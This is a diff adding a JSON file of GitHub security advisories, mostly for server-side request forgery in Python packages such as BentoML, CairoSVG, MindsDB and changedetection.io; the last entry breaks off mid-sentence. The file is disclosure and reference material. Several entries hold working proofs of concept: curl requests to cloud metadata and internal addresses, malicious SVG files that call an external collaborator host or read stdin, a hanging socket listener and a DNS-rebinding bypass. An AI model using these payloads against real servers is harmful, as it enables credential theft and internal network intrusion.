@@ -1,0 +1,434 @@
+[
+  {
+    "ghsa_id": "GHSA-mrmq-3q62-6cc8",
+    "cve_id": "CVE-2025-54381",
+    "summary": "BentoML SSRF Vulnerability in File Upload Processing  ",
+    "description": "### Description\n\nThere's an SSRF in the file upload processing system that allows remote attackers to make arbitrary HTTP requests from the server without authentication. The vulnerability exists in the serialization/deserialization handlers for multipart form data and JSON requests, which automatically download files from user-provided URLs without proper validation of internal network addresses.\n\nThe framework automatically registers any service endpoint with file-type parameters (`pathlib.Path`, `PIL.Image.Image`) as vulnerable to this attack, making it a framework-wide security issue that affects most real-world ML services handling file uploads. While BentoML implements basic URL scheme validation in the `JSONSerde` path, the `MultipartSerde` path has no validation whatsoever, and neither path restricts access to internal networks, cloud metadata endpoints, or localhost services.\n\nThe documentation explicitly promotes this URL-based file upload feature, making it an intended but insecure design that exposes all deployed services to SSRF attacks by default.\n\n### Source - Sink Analysis\n\n**Source:** User-controlled multipart form field values and JSON request bodies containing URLs\n\n**Call Chain - Path 1 (MultipartSerde - No Validation):**\n1. HTTP POST request with multipart form data to any BentoML endpoint with file-type input parameters  \n2. `MultipartSerde.parse_request()` in `src/_bentoml_impl/serde.py:202` processes the request\n3. `form = await request.form()` parses multipart data using Starlette\n4. For file-type fields: `value = [await self.ensure_file(v) for v in form.getlist(k)]` at line 209\n5. `MultipartSerde.ensure_file()` called at lines 186-200 with user-controlled string URL\n6. **Sink:** `resp = await client.get(obj)` at line 193 - Direct HTTP request with zero validation\n\n**Call Chain - Path 2 (JSONSerde - Weak Validation):**  \n1. HTTP POST request with JSON body containing URL to endpoint with `IORootModel` + `multipart_fields`\n2. `JSONSerde.parse_request()` in `src/_bentoml_impl/serde.py:157` processes the request\n3. `body = await request.body()` extracts request body\n4. Condition check: `if issubclass(cls, IORootModel) and cls.multipart_fields:` at line 164\n5. Weak validation: `if is_http_url(url := body.decode(\"utf-8\", \"ignore\")):` at line 165 (only checks scheme)\n6. **Sink:** `resp = await client.get(url)` at line 168 - HTTP request after insufficient validation\n\n### Proof of Concept\n\nCreate a BentoML service:\n```python\nfrom pathlib import Path\nimport bentoml\n\n@bentoml.service  \nclass ImageProcessor:\n    @bentoml.api\n    def process_image(self, image: Path) -> str:\n        return f\"Processed image: {image}\"\n```\n\nDeploy and exploit:\n```bash\n# Start service (binds to 0.0.0.0:3000 by default)\nbentoml serve service.py:ImageProcessor\n\n# SSRF Attack 1 - Access AWS metadata  \ncurl -X POST http://target:3000/process_image \\\n     -F 'image=http://169.254.169.254/latest/meta-data/'\n\n# SSRF Attack 2 - Internal service enumeration\ncurl -X POST http://target:3000/process_image \\  \n     -F 'image=http://localhost:8080/admin'\n\n# SSRF Attack 3 - Internal network scanning\ncurl -X POST http://target:3000/process_image \\\n     -F 'image=http://10.0.0.1:22'\n```\n\nExpected result: Server makes HTTP requests to internal/cloud endpoints, potentially returning sensitive data in error messages or logs.\n\n### Impact\n- Access AWS/GCP/Azure cloud metadata services for credential theft\n- Enumerate and interact with internal HTTP services and APIs  \n- Bypass firewall restrictions to reach internal network resources\n- Perform network reconnaissance from the server's perspective\n- Retrieve sensitive information disclosed in HTTP response data\n- Potential for internal service exploitation through crafted requests\n\n### Remediation  \n\nImplement comprehensive URL validation in both serialization paths by adding network restriction checks to prevent access to internal/private network ranges, localhost, and cloud metadata endpoints. The existing `is_http_url()` function should be enhanced to include allowlist validation rather than just scheme checking.",
+    "severity": "critical",
+    "cvss_score": 9.9,
+    "cwes": [
+      "CWE-918"
+    ],
+    "published_at": "2025-07-29T19:24:47Z",
+    "references": [
+      "https://github.com/bentoml/BentoML/security/advisories/GHSA-mrmq-3q62-6cc8",
+      "https://github.com/bentoml/BentoML/commit/534c3584621da4ab954bdc3d814cc66b95ae5fb8",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-54381",
+      "https://github.com/advisories/GHSA-mrmq-3q62-6cc8"
+    ],
+    "patch_urls": [
+      "https://github.com/bentoml/BentoML/commit/534c3584621da4ab954bdc3d814cc66b95ae5fb8"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "bentoml",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 1.4.0, < 1.4.19"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-rwmf-w63j-p7gv",
+    "cve_id": "CVE-2023-27586",
+    "summary": "CairoSVG improperly processes SVG files loaded from external resources",
+    "description": "# SSRF vulnerability\n\n## Summary\nWhen CairoSVG processes an SVG file, it can make requests to the inner host and different outside hosts.\n\n## Operating system, version and so on\nLinux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9\n\n## Tested CairoSVG version\n2.6.0\n\n## Details\nA specially crafted SVG file that loads an external resource from a URL. Remote attackers could exploit this vulnerability to cause a scan of an organization's internal resources or a DDOS attack on external resources.\nIt looks like this bug can affect websites and cause request forgery on the server.\n\n## PoC\n1. Generating malicious svg file:\n1.1 CairoSVG_exploit.svg:\n```svg\n<?xml version=\"1.0\" standalone=\"yes\"?>\n    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n    <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n    <image height=\"200\" width=\"200\" xlink:href=\"http://[jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com](http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/)/3\" />\n    <style type=\"text/css\">@import url(\"http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/5\");</style>\n    <style type=\"text/css\">\n         <![CDATA[\n            @import url(\"http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/9\");\n            rect { fill: red; stroke: blue; stroke-width: 3 }\n         ]]>\n    </style>\n</svg>\n```\n\n1.2 CairoSVG_exploit_2.svg:\n```svg\n<?xml version=\"1.0\" standalone=\"yes\"?>\n    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n    <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n    <defs>\n        <pattern id=\"img1\" patternUnits=\"userSpaceOnUse\" width=\"600\" height=\"450\">\n            <image xlink:href=\"http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/11\" x=\"0\" y=\"0\" width=\"600\" height=\"450\" />\n        </pattern>\n    </defs>\n    <path d=\"M5,50 l0,100 l100,0 l0,-100 l-100,0 M215,100 a50,50 0 1 1 -100,0 50,50 0 1 1 100,0 M265,50 l50,100 l-100,0 l50,-100 z\" fill=\"url(#img1)\" />\n</svg>\n```\n\n1.3 CairoSVG_exploit_3.svg:\n```svg\n<?xml version=\"1.0\" standalone=\"yes\"?>\n    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n    <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n    <use href=\"http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/13\" />\n</svg>\n```\n\n2. Run some commands:\n`$ python3 -m cairosvg CairoSVG_exploit.svg -f png`\n`$ python3 -m cairosvg CairoSVG_exploit_2.svg -f png`\n`$ python3 -m cairosvg CairoSVG_exploit_3.svg -f png `\n\n3. See result requests in Burp Collaborator:\n![1](https://user-images.githubusercontent.com/952243/224340068-547b1d9a-5513-48a5-9cdf-b34b693f80c2.png)\n\n\n\n# DOS vulnerability with SSTI\n\n## Summary\nWhen CairoSVG processes an SVG file, it can send requests to external hosts and wait for a response from the external server after a successful TCP handshake. This will cause the server to hang.\nIt seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.\n\n## Operating system, version and so on\nLinux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9\n\n## Tested CairoSVG version\n2.6.0\n\n## PoC\n1. Generating malicious svg file:\n\n```svg\n<?xml version=\"1.0\" standalone=\"yes\"?>\n    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n    <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n    <use href=\"http://192.168.56.1:1234/\" />\n</svg>\n```\n\n2. In other server run this python program:\n\n```python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('0.0.0.0', 1234))\ns.listen(1)\nconn, addr = s.accept()\nwith conn:\n    while True:\n        data = conn.recv(2048)\ns.close()\n```\n\n3. Run commands:\n`$timeout 60 python3 -m cairosvg CairoSVG_exploit_dos.svg -f png`\n(without timeout server will hang forever)\n\n\n# DOS vulnerability with stdin file descriptor\n\n## Summary\n\nSpecially crafted SVG file that opens /proc/self/fd/1 or /dev/stdin results in a hang with a tiny PoC file. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted SVG file.\nIt seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.\n\n## Operating system, version and so on\nLinux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9\n\n## Tested CairoSVG version\n2.6.0\n\n## PoC\n1. Generating malicious svg file:\n\n```svg\n<?xml version=\"1.0\" standalone=\"yes\"?>\n    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n    <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n    <use href=\"file:///dev/stdin\" />\n</svg>\n```\n\n2. In other server run this python program:\n```python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('0.0.0.0', 1234))\ns.listen(1)\nconn, addr = s.accept()\nwith conn:\n    while True:\n        data = conn.recv(2048)\ns.close()\n```\n\n3. Run commands:\n`$timeout 60 python3 -m cairosvg cariosvg_exploit_dos.svg -f png`",
+    "severity": "high",
+    "cvss_score": 9.9,
+    "cwes": [
+      "CWE-20",
+      "CWE-918"
+    ],
+    "published_at": "2023-03-20T21:27:15Z",
+    "references": [
+      "https://github.com/Kozea/CairoSVG/security/advisories/GHSA-rwmf-w63j-p7gv",
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-27586",
+      "https://github.com/Kozea/CairoSVG/commit/12d31c653c0254fa9d9853f66b04ea46e7397255",
+      "https://github.com/Kozea/CairoSVG/commit/33007d4af9195e2bfb2ff9af064c4c2d8e4b2b53",
+      "https://github.com/Kozea/CairoSVG/releases/tag/2.7.0",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/cairosvg/PYSEC-2023-9.yaml",
+      "https://github.com/advisories/GHSA-rwmf-w63j-p7gv"
+    ],
+    "patch_urls": [
+      "https://github.com/Kozea/CairoSVG/commit/12d31c653c0254fa9d9853f66b04ea46e7397255",
+      "https://github.com/Kozea/CairoSVG/commit/33007d4af9195e2bfb2ff9af064c4c2d8e4b2b53"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "CairoSVG",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.7.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-6wgj-66m2-xxp2",
+    "cve_id": "CVE-2023-48022",
+    "summary": "Ray has arbitrary code execution via jobs submission API",
+    "description": "Anyscale Ray allows a remote attacker to execute arbitrary code via the job submission API. NOTE: the vendor's position is that this report is irrelevant because Ray, as stated in its documentation, is not intended for use outside of a strictly controlled network environment.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-829",
+      "CWE-918"
+    ],
+    "published_at": "2023-11-28T09:30:26Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-48022",
+      "https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0",
+      "https://docs.ray.io/en/latest/ray-security/index.html",
+      "https://www.vicarius.io/vsociety/posts/shadowray-cve-2023-48022-exploit",
+      "https://atlas.mitre.org/studies/AML.CS0023",
+      "https://github.com/ray-project/ray/commit/978947083b1e192dba61ef653c863b11d56b0936",
+      "https://console.vulncheck.com/cve/CVE-2023-48022",
+      "https://github.com/advisories/GHSA-xg2h-7cxj-3gvh",
+      "https://github.com/honysyang/Ray",
+      "https://www.anyscale.com/blog/update-on-ray-cve-2023-48022-new-verification-tooling-available",
+      "https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild",
+      "https://www.vulncheck.com/blog/initial-access-intelligence-august-2024",
+      "https://docs.ray.io/en/latest/ray-security/token-auth.html",
+      "https://www.vicarius.io/vsociety/posts/the-story-of-shadowray-cve-2023-48022",
+      "https://github.com/advisories/GHSA-6wgj-66m2-xxp2"
+    ],
+    "patch_urls": [
+      "https://github.com/ray-project/ray/commit/978947083b1e192dba61ef653c863b11d56b0936"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "ray",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 2.49.2"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-59v3-898r-qwhj",
+    "cve_id": "CVE-2023-6974",
+    "summary": "MLflow Server-Side Request Forgery (SSRF)",
+    "description": "A malicious user could use this issue to access internal HTTP(s) servers and in the worst case (ie: aws instance) it could be abused to get a remote code execution on the victim machine.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-918"
+    ],
+    "published_at": "2023-12-20T06:30:25Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-6974",
+      "https://github.com/mlflow/mlflow/commit/8174250f83352a04c2d42079f414759060458555",
+      "https://huntr.com/bounties/438b0524-da0e-4d08-976a-6f270c688393",
+      "https://github.com/advisories/GHSA-59v3-898r-qwhj"
+    ],
+    "patch_urls": [
+      "https://github.com/mlflow/mlflow/commit/8174250f83352a04c2d42079f414759060458555"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "mlflow",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.9.2"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-8fxr-qfr9-p34w",
+    "cve_id": "CVE-2023-43654",
+    "summary": "TorchServe Server-Side Request Forgery vulnerability",
+    "description": "## Impact\n**Remote Server-Side Request Forgery (SSRF)**\n    **Issue**: TorchServe default configuration lacks proper input validation, enabling third parties to invoke remote HTTP download requests and write files to the disk. This issue could be taken advantage of to compromise the integrity of the system and sensitive data. This issue is present in versions `0.1.0` to `0.8.1`.\n    **Mitigation**: The user is able to load the model of their choice from any URL that they would like to use. The user of TorchServe is responsible for configuring both the [allowed_urls](https://github.com/pytorch/serve/blob/b3eced56b4d9d5d3b8597aa506a0bcf954d291bc/docs/configuration.md?plain=1#L296) and specifying the model URL to be used. A pull request to warn the user when the default value for `allowed_urls` is used has been merged - https://github.com/pytorch/serve/pull/2534. TorchServe release `0.8.2` includes this change.\n\n## Patches\n\n## TorchServe release 0.8.2 includes fixes to address the previously listed issue:\n\nhttps://github.com/pytorch/serve/releases/tag/v0.8.2\n\n**Tags for upgraded DLC release**\nUser can use the following new image tags to pull DLCs that ship with patched TorchServe version 0.8.2:\nx86 GPU\n\n* v1.9-pt-ec2-2.0.1-inf-gpu-py310\n* v1.8-pt-sagemaker-2.0.1-inf-gpu-py310\n\nx86 CPU\n\n* v1.8-pt-ec2-2.0.1-inf-cpu-py310\n* v1.7-pt-sagemaker-2.0.1-inf-cpu-py310\n\nGraviton\n\n* v1.7-pt-graviton-ec2-2.0.1-inf-cpu-py310\n* v1.5-pt-graviton-sagemaker-2.0.1-inf-cpu-py310\n\nNeuron\n\n* 1.13.1-neuron-py310-sdk2.13.2-ubuntu20.04\n* 1.13.1-neuronx-py310-sdk2.13.2-ubuntu20.04\n* 1.13.1-neuronx-py310-sdk2.13.2-ubuntu20.04\n\nThe full DLC image URI details can be found at: https://github.com/aws/deep-learning-containers/blob/master/available_images.md#available-deep-learning-containers-images\n\n## References\nhttps://github.com/pytorch/serve/blob/b3eced56b4d9d5d3b8597aa506a0bcf954d291bc/docs/configuration.md?plain=1#L296\nhttps://github.com/pytorch/serve/pull/2534\nhttps://github.com/pytorch/serve/releases/tag/v0.8.2\nhttps://github.com/aws/deep-learning-containers/blob/master/available_images.md#available-deep-learning-containers-images\n\n## Credit\nWe would like to thank Oligo Security for responsibly disclosing this issue and working with us on its resolution.\nIf you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting[)](https://aws.amazon.com/security/vulnerability-reporting)) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-918"
+    ],
+    "published_at": "2023-10-02T20:39:20Z",
+    "references": [
+      "https://github.com/pytorch/serve/security/advisories/GHSA-8fxr-qfr9-p34w",
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-43654",
+      "https://github.com/pytorch/serve/pull/2534",
+      "https://github.com/pytorch/serve/releases/tag/v0.8.2",
+      "http://packetstormsecurity.com/files/175095/PyTorch-Model-Server-Registration-Deserialization-Remote-Code-Execution.html",
+      "https://github.com/advisories/GHSA-8fxr-qfr9-p34w"
+    ],
+    "patch_urls": [
+      "https://github.com/pytorch/serve/pull/2534"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "torchserve",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0.1.0, < 0.8.2"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-4jcv-vp96-94xr",
+    "cve_id": "CVE-2024-24759",
+    "summary": "MindsDB Vulnerable to Bypass of SSRF Protection with DNS Rebinding",
+    "description": "### Summary\n\nDNS rebinding is a method of manipulating resolution of domain names to let the initial DNS query hits an address and the second hits another one. For instance the host `make-190.119.176.200-rebind-127.0.0.1-rr.1u.ms`  would be initially resolved to `190.119.176.200` and the next DNS issue to `127.0.0.1`. Please notice the following in the latest codebase:\n\n```python\ndef is_private_url(url: str):\n    \"\"\"\n    Raises exception if url is private\n\n    :param url: url to check\n    \"\"\"\n\n    hostname = urlparse(url).hostname\n    if not hostname:\n        # Unable to find hostname in url\n        return True\n    ip = socket.gethostbyname(hostname)\n    return ipaddress.ip_address(ip).is_private\n\n``` \n\nAs you can see, during the call to `is_private_url()` the initial DNS query would be issued by `ip = socket.gethostbyname(hostname)` to an IP (public one) and then due to DNS Rebinding, the next GET request would goes to the private one.\n\n### PoC\n\n```python\nfrom flask import Flask, request, jsonify\nfrom urllib.parse import urlparse\nimport socket\nimport ipaddress\nimport requests\n\napp = Flask(__name__)\n\n\ndef is_private_url(url: str):\n    \"\"\"\n    Raises exception if url is private\n\n    :param url: url to check\n    \"\"\"\n\n    hostname = urlparse(url).hostname\n    if not hostname:\n        # Unable to find hostname in url\n        return True\n    ip = socket.gethostbyname(hostname)\n    if ipaddress.ip_address(ip).is_private:\n        raise Exception(f\"Private IP address found for {url}\")\n\n\n@app.route(\"/\", methods=[\"GET\"])\ndef index():\n    return \"http://127.0.0.1:5000/check_private_url?url=https://www.google.Fr\"\n\n\n@app.route(\"/check_private_url\", methods=[\"GET\"])\ndef check_private_url():\n    url = request.args.get(\"url\")\n\n    if not url:\n        return jsonify({\"error\": 'Missing \"url\" parameter'}), 400\n\n    try:\n        is_private_url(url)\n        response = requests.get(url)\n\n        return jsonify(\n            {\n                \"url\": url,\n                \"is_private\": False,\n                \"text\": response.text,\n                \"status_code\": response.status_code,\n            }\n        )\n    except Exception as e:\n        return jsonify({\"url\": url, \"is_private\": True, \"error\": str(e)})\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n\n```\n\nAfter running the poc.py with flask installed, consider visiting the following URLs:\n\n1. http://127.0.0.1:5000/check_private_url?url=https://www.example.com since it is in the public space, you would get `is_private: false` and the GET request would be issued to the www.Example.com website.\n3. http://127.0.0.1:5000/check_private_url?url=http://localhost:8667, this one the address is private, you would get `is_private: true`\n4. http://127.0.0.1:5000/check_private_url?url=http://make-190.119.176.214-rebind-127.0.0.1-rr.1u.ms:8667/ But this one, it initially returns the public IP `190.119.176.214` and then DNS rebind into the network location `127.0.0.1:8667`.\n\nI set up a simple HTTP server at `127.0.0.1:8667`, you can notice the results of the PoC in the next screenshot:\n\n```\n{\n  \"is_private\": false,\n  \"status_code\": 200,\n  \"text\": \"<pre>\\n<a href=\\\"poc.py\\\">poc.py</a>\\n</pre>\\n\",\n  \"url\": \"http://make-190.119.176.214-rebind-127.0.0.1-rr.1u.ms:8667/\"\n}\n\n```\n\n\n### Impact\n - Bypass the SSRF protection on the whole website with DNS Rebinding.\n - DoS too.\n",
+    "severity": "high",
+    "cvss_score": 9.3,
+    "cwes": [
+      "CWE-350",
+      "CWE-918"
+    ],
+    "published_at": "2024-09-05T16:37:56Z",
+    "references": [
+      "https://github.com/mindsdb/mindsdb/security/advisories/GHSA-4jcv-vp96-94xr",
+      "https://github.com/mindsdb/mindsdb/commit/5f7496481bd3db1d06a2d2e62c0dce960a1fe12b",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-24759",
+      "https://github.com/advisories/GHSA-4jcv-vp96-94xr"
+    ],
+    "patch_urls": [
+      "https://github.com/mindsdb/mindsdb/commit/5f7496481bd3db1d06a2d2e62c0dce960a1fe12b"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "mindsdb",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 23.12.4.2"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-q97g-c29h-x2p7",
+    "cve_id": "CVE-2024-22203",
+    "summary": "Whoogle Search Path Traversal vulnerability",
+    "description": "Whoogle Search is a self-hosted metasearch engine. In versions prior to 0.8.4, the `element` method in `app/routes.py` does not validate the user-controlled `src_type` and `element_url` variables and passes them to the `send` method which sends a GET request on lines 339-343 in `request.py`, which leads to a server-side request forgery. This issue allows for crafting GET requests to internal and external resources on behalf of the server. For example, this issue would allow for accessing resources on the internal network that the server has access to, even though these resources may not be accessible on the internet. This issue is fixed in version 0.8.4.",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cwes": [
+      "CWE-918"
+    ],
+    "published_at": "2024-03-14T20:37:57Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-22203",
+      "https://github.com/benbusby/whoogle-search/commit/3a2e0b262e4a076a20416b45e6b6f23fd265aeda",
+      "https://github.com/benbusby/whoogle-search/blob/92e8ede24e9277a5440d403f75877209f1269884/app/request.py#L339-L343",
+      "https://github.com/benbusby/whoogle-search/blob/92e8ede24e9277a5440d403f75877209f1269884/app/routes.py#L465-L490",
+      "https://github.com/benbusby/whoogle-search/blob/92e8ede24e9277a5440d403f75877209f1269884/app/routes.py#L466",
+      "https://github.com/benbusby/whoogle-search/blob/92e8ede24e9277a5440d403f75877209f1269884/app/routes.py#L476",
+      "https://github.com/benbusby/whoogle-search/blob/92e8ede24e9277a5440d403f75877209f1269884/app/routes.py#L479",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/whoogle-search/PYSEC-2024-20.yaml",
+      "https://securitylab.github.com/advisories/GHSL-2023-186_GHSL-2023-189_benbusby_whoogle-search",
+      "https://github.com/advisories/GHSA-q97g-c29h-x2p7"
+    ],
+    "patch_urls": [
+      "https://github.com/benbusby/whoogle-search/commit/3a2e0b262e4a076a20416b45e6b6f23fd265aeda"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "whoogle-search",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0, < 0.8.4"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-3q6g-qmpx-rqw4",
+    "cve_id": "CVE-2024-22205",
+    "summary": "Whoogle Search Server-Side Request Forgery vulnerability",
+    "description": "Whoogle Search is a self-hosted metasearch engine. In versions 0.8.3 and prior, the `window` endpoint does not sanitize user-supplied input from the `location` variable and passes it to the `send` method which sends a `GET` request on lines 339-343 in `request.py,` which leads to a server-side request forgery. This issue allows for crafting GET requests to internal and external resources on behalf of the server. For example, this issue would allow for accessing resources on the internal network that the server has access to, even though these resources may not be accessible on the internet. This issue is fixed in version 0.8.4.\n\n",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cwes": [
+      "CWE-918"
+    ],
+    "published_at": "2024-03-14T20:37:57Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-22205",
+      "https://github.com/benbusby/whoogle-search/commit/3a2e0b262e4a076a20416b45e6b6f23fd265aeda",
+      "https://github.com/benbusby/whoogle-search/blob/92e8ede24e9277a5440d403f75877209f1269884/app/request.py#L339-L343",
+      "https://github.com/benbusby/whoogle-search/blob/92e8ede24e9277a5440d403f75877209f1269884/app/routes.py#L479",
+      "https://github.com/benbusby/whoogle-search/blob/92e8ede24e9277a5440d403f75877209f1269884/app/routes.py#L496-L557",
+      "https://github.com/benbusby/whoogle-search/blob/92e8ede24e9277a5440d403f75877209f1269884/app/routes.py#L497",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/whoogle-search/PYSEC-2024-18.yaml",
+      "https://securitylab.github.com/advisories/GHSL-2023-186_GHSL-2023-189_benbusby_whoogle-search",
+      "https://github.com/advisories/GHSA-3q6g-qmpx-rqw4"
+    ],
+    "patch_urls": [
+      "https://github.com/benbusby/whoogle-search/commit/3a2e0b262e4a076a20416b45e6b6f23fd265aeda"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "whoogle-search",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0, < 0.8.4"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-j8w6-2r9h-cxhj",
+    "cve_id": "CVE-2023-50731",
+    "summary": "GitHub Security Lab (GHSL) Vulnerability Report: Arbitary write GHSL-2023-182 ",
+    "description": "### Impact\n\nIssue: Arbitrary file write in file.py (GHSL-2023-183)\n\n### Patches\n\nUse mindsdb staging branch or v23.11.4.1",
+    "severity": "high",
+    "cvss_score": 9.1,
+    "cwes": [
+      "CWE-22",
+      "CWE-918"
+    ],
+    "published_at": "2023-12-15T04:02:30Z",
+    "references": [
+      "https://github.com/mindsdb/mindsdb/security/advisories/GHSA-j8w6-2r9h-cxhj",
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-50731",
+      "https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L122-L125",
+      "https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L138",
+      "https://securitylab.github.com/advisories/GHSL-2023-182_GHSL-2023-184_mindsdb_mindsdb",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/mindsdb/PYSEC-2023-279.yaml",
+      "https://github.com/advisories/GHSA-j8w6-2r9h-cxhj"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "mindsdb",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 23.7.4.1"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-655w-fm8m-m478",
+    "cve_id": "CVE-2023-46229",
+    "summary": "LangChain Server Side Request Forgery vulnerability",
+    "description": "LangChain before 0.0.317 allows SSRF via `document_loaders/recursive_url_loader.py` because crawling can proceed from an external server to an internal server.",
+    "severity": "high",
+    "cvss_score": 8.8,
+    "cwes": [
+      "CWE-918"
+    ],
+    "published_at": "2023-10-19T06:30:23Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-46229",
+      "https://github.com/langchain-ai/langchain/pull/11925",
+      "https://github.com/langchain-ai/langchain/commit/9ecb7240a480720ec9d739b3877a52f76098a2b8",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2023-205.yaml",
+      "https://github.com/advisories/GHSA-655w-fm8m-m478"
+    ],
+    "patch_urls": [
+      "https://github.com/langchain-ai/langchain/pull/11925",
+      "https://github.com/langchain-ai/langchain/commit/9ecb7240a480720ec9d739b3877a52f76098a2b8"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "langchain",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0, < 0.0.317"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-3c45-4pj5-ch7m",
+    "cve_id": "CVE-2026-27696",
+    "summary": "changedetection.io is Vulnerable to SSRF via Watch URLs",
+    "description": "## Summary\n\nChangedetection.io is vulnerable to Server-Side Request Forgery (SSRF) because the URL validation function `is_safe_valid_url()` does not validate the resolved IP address of watch URLs against private, loopback, or link-local address ranges. An authenticated user (or any user when no password is configured, which is the default) can add a watch for internal network URLs such as:\n\n- `http://169.254.169.254`\n- `http://10.0.0.1/`\n- `http://127.0.0.1/`\n\nThe application fetches these URLs server-side, stores the response content, and makes it viewable through the web UI — enabling full data exfiltration from internal services.\n\nThis is particularly severe because:\n\n- The fetched content is stored and viewable - this is not a blind SSRF\n- Watches are fetched periodically - creating a persistent SSRF that continuously accesses internal resources\n- By default, no password is set - the web UI is accessible without authentication\n- Self-hosted deployments typically run on cloud infrastructure where `169.254.169.254` returns real IAM credentials\n\n---\n\n## Details\n\nThe URL validation function `is_safe_valid_url()` in `changedetectionio/validate_url.py` (lines 60–122) validates the URL protocol (http/https/ftp) and format using the `validators` library, but does not perform any 